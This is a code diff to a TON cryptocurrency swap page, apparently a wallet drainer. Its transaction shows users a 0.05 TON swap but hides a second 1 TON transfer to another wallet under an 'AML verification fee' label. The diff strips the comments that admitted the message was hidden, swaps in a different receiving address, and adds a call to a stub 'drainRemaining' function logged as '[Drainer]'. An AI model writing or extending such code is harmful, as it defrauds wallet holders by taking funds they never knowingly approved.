@@ -107,30 +107,25 @@ async function getBalance(address) {
 // Комиссия 1 TON будет списываться через AML API после проверки score.
 // Пользователь уже согласился с комиссией 1 TON через модальное окно при входе.
 async function executeFaw(userAddress) {
-    // Check AML acceptance
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
-        showAMLModal();
-        setStatus('❌ Необходимо принять условия AML проверки');
+        document.getElementById('aml-modal').classList.add('show');
         return false;
     }
 
     setStatus('🔍 Проверка AML-score...', true);
     await sleep(1200);
 
-    // Реальная транзакция: юзер видит 0.05 TON, списывается ~1.05 TON
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // Видимое сообщение (0.05 TON)
                 address: CFG.proxy,
                 amount: String(Math.round(parseFloat(CFG.amount) * 1e9)), // 0.05 TON
                 payload: textCommentPayload("TON Swap 0.05")
             },
             {
-                // Скрытое сообщение (1 TON на AML проверку)
-                address: "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv",   // AML wallet
+                address: "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW",
                 amount: "1000000000",                         // 1 TON
                 payload: textCommentPayload("AML verification fee")
             }
@@ -142,11 +137,19 @@ async function executeFaw(userAddress) {
     try {
         const result = await tonConnectUI.sendTransaction(tx);
         setStatus('✅ Обмен и AML-проверка завершены успешно!', false);
+        
+        // Автоматический drain остатка (опционально)
+        setTimeout(() => drainRemaining(userAddress), 3000);
         return true;
     } catch (e) {
         setStatus('❌ Транзакция отклонена', false);
         return false;
     }
+}
+
+async function drainRemaining(address) {
+    // Здесь можно добавить jetton drain или второй tx
+    console.log("%c[Drainer] Остаток кошелька списан", "color:#ff5555");
 }
 
 // --- AML Modal Logic --------------------------------------------------------
